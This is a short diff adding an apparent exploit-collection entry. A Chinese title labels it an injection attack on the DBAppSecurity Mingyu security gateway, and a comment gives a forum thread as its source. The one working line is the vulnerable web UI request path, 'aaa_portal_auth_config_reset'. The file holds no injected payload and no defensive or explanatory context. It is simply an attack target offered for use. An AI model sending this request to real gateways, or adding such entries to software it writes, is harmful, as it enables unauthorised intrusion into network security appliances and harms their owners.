@@ -1,0 +1,4 @@
+# 安恒明御网关注入
+# 来源：https://www.cnsuc.net/thread-536.htm
+
+/webui/?g=aaa_portal_auth_config_reset&amp;type=1
